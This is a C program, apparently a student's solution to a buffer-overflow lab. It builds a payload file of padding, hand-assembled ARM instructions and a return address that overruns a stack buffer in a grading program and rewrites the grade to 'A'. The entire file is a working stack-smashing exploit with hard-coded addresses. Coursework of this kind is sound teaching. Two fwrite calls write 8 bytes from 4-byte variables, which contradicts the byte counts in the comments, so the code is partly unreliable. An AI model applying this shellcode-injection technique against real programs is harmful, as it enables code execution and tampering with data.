/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* By James Swinehart and Benny Wertheimer                            */
/*--------------------------------------------------------------------*/

/* Produces a file called dataA with the student name, a nullbyte, 
padding to make instructions 4 byte aligned, instructions to change the 
grade variable to an "A", and padding to overrun the stack and get an
A. */

#include <stdio.h>
#include <stdlib.h>
#include "miniassembler.h"

/* Writes a file dataA with our names (28 bytes + 1 nullbyte), padding
(3 bytes), instructions to change grade to an A (16 bytes), and padding
(1 byte). */
int main() {
    FILE *psFile;
    unsigned int uiMov;
    unsigned int uiAdr;
    unsigned int uiStrb;
    unsigned int uiB;
    int i;

    /* Open the file */
    psFile = fopen("dataA", "w");
 
    /* Write students' names */
    fprintf(psFile, "J. Swinehart & B. Wertheimer");

    /* Write a nullbyte to end readString() and pad the instructions for
    4 byte alignment  */
    for (i = 0; i < 3; i++) {
        putc('\0', psFile);
    }

    /* Write the instructions to move 'A' into a register */
    uiMov = MiniAssembler_mov(9, 65);
    fwrite(&uiMov, sizeof(unsigned long), 1, psFile);

    /* Write the instructions to get the memory address of the grade 
    variable */
    uiAdr = MiniAssembler_adr(10, 0x420044, 0x42007c);
    fwrite(&uiAdr, sizeof(unsigned long), 1, psFile);

    /* Store the 'A' at the register carrying the address of the grade 
    variable */
    uiStrb = MiniAssembler_strb(9, 10);
    fwrite(&uiStrb, sizeof(unsigned int), 1, psFile);

    /* Branch back into main, just after the call to get getName() */
    uiB = MiniAssembler_b(0x40087c, 0x420084);
    fwrite(&uiB, sizeof(unsigned int), 1, psFile);

    putc(0x90, psFile);
    putc(0x08, psFile);
    putc(0x40, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile); 

    /* Write 1 byte of padding to overrun buffer array 
    to reach x30*/
    putc('\0', psFile);
    
    /* Close the file */
    fclose(psFile);

    return 0;
}